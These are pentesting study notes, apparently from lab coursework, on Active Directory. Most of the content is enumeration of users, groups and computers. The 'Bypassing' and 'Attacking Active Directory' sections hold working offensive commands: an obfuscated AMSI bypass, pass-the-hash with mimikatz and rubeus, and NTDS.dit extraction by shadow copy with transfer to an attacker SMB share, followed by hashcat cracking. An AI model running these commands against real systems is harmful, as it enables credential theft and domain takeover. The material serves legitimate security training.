---
title: LDAP - Active Directory
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - active
  - directory
  - ldap
  - windows
---
# LDAP - Active directory

Active Directory (AD) is a directory service for Windows network environments.  Lightweight Directory Access Protocol (LDAP) is an integral part of Active Directory (AD). The **Lightweight Directory Access Protocol** (**LDAP**) is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over a TCP/IP Internet Protocol (IP) network.

[And what about LDAP? See here](389-636-ldap.md).

## Tools

### xfreerdp

[See cheat sheet](xfreerdp.md).

```bash
xfreerdp /v:$ip /u:htb-student /p:<password> /cert-ignore
```


### RSAT (Remote Server Administration Tools)

[RSAT (Remote Server Administration Tools)](rsat-remote-server-administration-tools.md) cheat sheet:

```ps
# Check if RSAT tools are installed
Get-WindowsCapability -Name RSAT* -Online \| Select-Object -Property Name, State

# Install all RSAT tools
Get-WindowsCapability -Name RSAT* -Online \| Add-WindowsCapability –Online

# Install a specific RSAT tool, for instance Rsat.ActiveDirectory.DS-LDS.Tools 
Add-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0  –Online
```

Once installed, all of the tools will be available under: Control Panel> All Control Panel Items >Administrative Tools.


## Bypassing

#### **Bypass Execution Policy**

```ps
powershell -ep bypass
```

#### **Bypass AMSI**

```ps
**S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )**
```


#### **Run a utility as another user**

```cmd
# Run a utility as another user
runas /netonly /user:htb.local\jackie.may powershell

# Run an utility as another user with rubeus. Passing clear text credentials
rubeus.exe asktgt /user:jackie.may /domain:htb.local /dc:10.10.110.100 /rc4:ad11e823e1638def97afa7cb08156a94

# Run an utility as another user with mimikatz.exe. Passing clear text credentials
mimikatz.exe sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:ad11e823e1638def97afa7cb08156a94

```


## Enumeration

Basic reconnaissance: Who I am, where I am and what permissions I have.

```ps 
whoami
hostname
net localgroup administrators

# View a user's current rights
whoami /priv
```


A basic AD user account with no added privileges can be used to enumerate the majority of objects contained within AD, including but not limited to:

### **1.** Domain Computers

```ps
# Use ADSI to search for all computers
([adsisearcher]"(&(objectClass=Computer))").FindAll()

#Query for installed software
get-ciminstance win32_product \| fl
```


### **2.** Domain Users

Two ways. **First**, if we compromise a domain-joined system (or a client has you perform an AD assessment from one of their workstations) we can leverage RSAT to enumerate AD (Active Directory Users and Computers and ADSI Edit modules). **Second**, we can enumerate the domain from a non-domain joined host (provided that it is in a subnet that communicates with a domain controller) by launching any RSAT snap-ins using "runas" from the command line.

```ps
# Gets one or more Active Directory users.
Get-ADUser

# List disabled users
Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | select name

# Count all users in an OU
(Get-ADUser -SearchBase "OU=Employees,DC=INLANEFREIGHT,DC=LOCAL" -Filter *).count
```


We can also open the MMC Console from a non-domain joined computer using the following command syntax ([See here how to deal with following steps the MMC interface](mmc-console.md)):

```cmd-session
runas /netonly /user:Domain_Name\Domain_USER mmc
```

Also, [NT Authority/System](nt-authority-system.md) is a LocalSystem account built-in in Windows operating systems, used by the service control manager. Having SYSTEM-level access within a domain environment is nearly equivalent to having a domain user account. The only real limitation is not being able to perform cross-trust Kerberos attacks such as Kerberoasting ( [See techniques to gain SYSTEM-level access on a host](nt-authority-system.md)).

[Enumerating with powerview.ps1](powerview.md)

### **3.** Domain Group Information

```ps
# Get all administrative groups 
Get-ADGroup -Filter "adminCount -eq 1" \| select Name

# LDAP query to return all AD groups
Get-ADObject -LDAPFilter '(objectClass=group)' \| select cn

# Get AD groups using WMI 
Get-WmiObject -Class win32_group -Filter "Domain='INLANEFREIGHT'"

# Get information about an specific AD group
Get-ADGroup -Identity "<GROUP NAME>" -Properties *
```

 Domain Groups of interest:

```ps
Get-ADGroup -Identity "<GROUP NAME>" -Properties *
```

These are some groups with special permissions that, if missconfigured, might be exploited:

```ps
# Schema Admins | The Schema Admins group is a high privileged group in a forest root domain. The membership of this group must be limited. This group is use to modify the schema of forest. Additional accounts must only be added when changes to the schema are necessary and then must be removed. By default, the Administrator account is a member of this group. Because this group has significant power in the forest, add users with caution. Members can modify the Active Directory schema structure and can backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.
Get-ADGroup -Identity "Schema Admins" -Properties *

# Default Administrators | Domain Admins and Enterprise Admins "super" groups. A built-in group . Grants complete and unrestricted access to the computer, or if the computer is promoted to a domain controller, members have unrestricted access to the domain. This group cannot be renamed, deleted, or moved. This built-in group controls access to all the domain controllers in its domain, and it can change the membership of all administrative groups. Membership can be modified by members of the following groups: the default service Administrators, Domain Admins in the domain, or Enterprise Admins.
Get-ADGroup -Identity "Administrators" -Properties *

# Server Operators | A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer. Members can modify services, access SMB shares, and backup files. 
Get-ADGroup -Identity "Server Operators" -Properties *

# Backup Operators | A built-in group. By default, the group has no members. Backup Operators can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to the computer and shut it down. Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs. 
Get-ADGroup -Identity "Backup Operators" -Properties *

# Print Operators | A built-in group that exists only on domain controllers. By default, the only member is the Domain Users group. Print Operators can manage printers and document queues. They can also manage Active Directory printer objects in the domain. Members of this group can locally sign in to and shut down domain controllers in the domain. Because members of this group can load and unload device drivers on all domain controllers in the domain, add users with caution. This group cannot be renamed, deleted, or moved. Members are allowed to logon to DCs locally and "trick" Windows into loading a malicious driver. 
Get-ADGroup -Identity "Print Operators" -Properties *

# Hyper-V Administrators | Members of the Hyper-V Administrators group have complete and unrestricted access to all the features in Hyper-V. Adding members to this group helps reduce the number of members required in the Administrators group, and further separates access. If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.
Get-ADGroup -Identity "Hyper-V Administrators" -Properties *

# Account Operators | Grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers. Members of the Account Operators group cannot manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Members of this group cannot modify user rights. Members can modify non-protected accounts and groups in the domain. 
Get-ADGroup -Identity "Account Operators" -Properties *

# Remote Desktop Users | The Remote Desktop Users group on an RD Session Host server is used to grant users and groups permissions to remotely connect to an RD Session Host server. This group cannot be renamed, deleted, or moved. It appears as a SID until the domain controller is made the primary domain controller and it holds the operations master role (also known as flexible single master operations or FSMO). Members are not given any useful permissions by default but are often granted additional rights such as Allow Login Through Remote Desktop Services and can move laterally using the RDP protocol.
Get-ADGroup -Identity "Remote Desktop Users" -Properties *

# Remote Management Users | Members of the Remote Management Users group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user. The Remote Management Users group is generally used to allow users to manage servers through the Server Manager console, whereas the WinRMRemoteWMIUsers_ group is allows remotely running Windows PowerShell commands. Members are allowed to logon to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs). 
Get-ADGroup -Identity "Remote Management Users" -Properties *

# Group Policy Creator Owners | A global group that is authorized to create new Group Policy objects in Active Directory. By default, the only member of the group is Administrator. The default owner of a new Group Policy object is usually the user who created it. If the user is a member of Administrators or Domain Admins, all objects that are created by the user are owned by the group. Owners have full control of the objects they own. Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.
Get-ADGroup -Identity "Group Policy Creator Owners" -Properties *

# DNSAdmins | Members of this group have administrative access to the DNS Server service. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions. This group has no default members. Members have the ability to load a DLL on a DC but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to create a WPAD record.
Get-ADGroup -Identity "DNSAdmins" -Properties *
```



### **4.** Default Domain Policy

### **5.** Domain Functional Levels

```ps
# Get hostnames with the word "SQL" in their hostname 
Get-ADComputer  -Filter "DNSHostName -like 'SQL*'"` 
```

**6.** Password Policy

**7.** Group Policy Objects (GPOs)

**8.** Kerberos Delegation

```ps
# Find admin users that don't require Kerberos Pre-Auth
Get-ADUser -Filter {adminCount -eq '1' -and DoesNotRequirePreAuth -eq 'True'}
```

**9.** Domain Trusts

**10.** Access Control Lists (ACLs)

```ps
#  Enumerate UAC values for admin users
Get-ADUser -Filter {adminCount -gt 0} -Properties admincount,useraccountcontrol 
```

**11.** Remote access rights


Active Directory can be easily misconfigurable. These are common attacks:

- Kerberoasting / ASREPRoasting
- NTLM Relaying
- Network traffic poisoning
- Password spraying
- Kerberos delegation abuse
- Domain trust abuse
- Credential theft
- Object control



### Cheat sheet so far

| **Command**                                                                              | **Description**                                       |
| ---------------------------------------------------------------------------------------- | ----------------------------------------------------- |
| `xfreerdp /v:$ip /u:htb-student /p:<password>`                                           | RDP to lab target                                     |
|  `Get-ADGroup -Identity "<GROUP NAME"> -Properties *`                                    | Get information about an AD group                     |
| `whoami /priv`                                                                           | View a user's current rights                          |
| ` Get-WindowsCapability -Name RSAT* -Online \| Select-Object -Property Name, State`      | Check if RSAT tools are installed                     |
| `Get-WindowsCapability -Name RSAT* -Online \| Add-WindowsCapability –Online`             | Install all RSAT tools                                |
| `runas /netonly /user:htb.local\jackie.may powershell`                                   | Run a utility as another user                         |
| `Get-ADObject -LDAPFilter '(objectClass=group)' \| select cn`                            | LDAP query to return all AD groups                    |
| `Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' \| select name` | List disabled users                                   |
| `(Get-ADUser -SearchBase "OU=Employees,DC=INLANEFREIGHT,DC=LOCAL" -Filter *).count`      | Count all users in an OU                              |
| `get-ciminstance win32_product \| fl`                                                    | Query for installed software                          |
| `Get-ADComputer  -Filter "DNSHostName -like 'SQL*'"`                                     | Get hostnames with the word "SQL" in their hostname   |
| `Get-ADGroup -Filter "adminCount -eq 1" \| select Name`                                  | Get all administrative groups                         |
| `Get-ADUser -Filter {adminCount -eq '1' -and DoesNotRequirePreAuth -eq 'True'}`          | Find admin users that don't require Kerberos Pre-Auth |
| `Get-ADUser -Filter {adminCount -gt 0} -Properties admincount,useraccountcontrol`        | Enumerate UAC values for admin users                  |
| `Get-WmiObject -Class win32_group -Filter "Domain='INLANEFREIGHT'"`                      | Get AD groups using WMI                               |
| `([adsisearcher]"(&(objectClass=Computer))").FindAll()`                                  | Use ADSI to search for all computers                  |
|                                                                                          |                                                       |





## Acronyms


**ADSI**

Active Directory Service Interfaces (ADSI) is a set of COM interfaces used to access the features of directory services from different network providers. ADSI is used in a distributed computing environment to present a single set of directory service interfaces for managing network resources. Administrators and developers can use ADSI services to enumerate and manage the resources in a directory service, no matter which network environment contains the resource. ADSI enables common administrative tasks, such as adding new users, managing printers, and locating resources in a distributed computing environment.


**CIM**
The Common Information Model (CIM) is the **Distributed Management Task Force** (DMTF) standard [[DSP0004](https://www.dmtf.org/dsp/DSP0004)] for describing the structure and behavior of managed resources such as storage, network, or software components. One way to describe CIM is to say that it allows multiple parties to exchange management information about these managed elements. However, this falls short of fully capturing CIM's ability not only to describe these managed elements and the management information, but also to actively control and manage them. By using a common model of information, management software can be written once and work with many implementations of the common model without complex and costly conversion operations or loss of information.


**DIT**
Directory Information Tree. 


**[MMC](mmc-console.md)**
You use **Microsoft Management Console** (MMC) to create, save and open administrative tools, called consoles, which manage the hardware, software, and network components of your Microsoft Windows operating system.


**OU**

What is an organizational unit in Active Directory? An OU is a container within a Microsoft Windows Active Directory (AD) domain that can hold users, groups and computers. It is the smallest unit to which an administrator can assign Group Policy settings or account permissions.


**RSAT**

The Remote Server Administration Tools (RSAT) have been part of Windows since the days of Windows 2000. RSAT allows systems administrators to remotely manage Windows Server roles and features from a workstation running Windows 10, Windows 8.1, Windows 7, or Windows Vista. RSAT can only be installed on Professional or Enterprise editions of Windows.


**SID**

In the context of the Microsoft Windows NT line of operating systems, a Security Identifier is a unique, immutable identifier of a user, user group, or other security principal. 


**SPN**

A service principal name (SPN) is a unique identifier of a service instance. Kerberos authentication uses SPNs to associate a service instance with a service sign-in account. Doing so allows a client application to request service authentication for an account even if the client doesn't have the account name.


**UAC**

User Account Control (UAC) is a fundamental component of Microsoft's overall security vision. UAC helps mitigate the impact of malware.


## Attacking Active Directory

Once a Windows system is joined to a domain, it will no longer default to referencing [the SAM database](attacking-sam.md) to validate logon requests. That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on. 

If needed, use tools like [username Anarchy](username-anarchy.md) to create list of usernames.


### 1. Dumping ntds.dit

#### Dumping ntds.dit locally

`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources. Recall that `NTDS.dit` file is stored at `%systemroot$/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model).

The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html). This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain


```shell-session
# Connect to a DC with Evil-WinRM
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'

# To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. Check Local Group Membership:
*Evil-WinRM* PS C:\> net localgroup

# Check User Account Privileges including Domain. If the account has both Administrators and Domain Administrator rights, this means we can do just about anything we want, including making a copy of the NTDS.dit file.
net user <username>

# Use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. Create a Shadow Copy of C:
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

# Copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

[Launch smbserver in our attacker machine](smbserver.md):

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/username/Documents/
```

Now, from PS in the victim's windows machine:

```powershell
# Transfer the file to attacker machine
cmd.exe /c move C:\NTDS\NTDS.dit \\$ip\CompData
```

And... crack the hash with [hashcat](hashcat.md):

```bash
sudo hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt
```


#### Dumpins ntds.dit remotely

```bash
crackmapexec smb $ip -u <username> -p <password> --ntds
```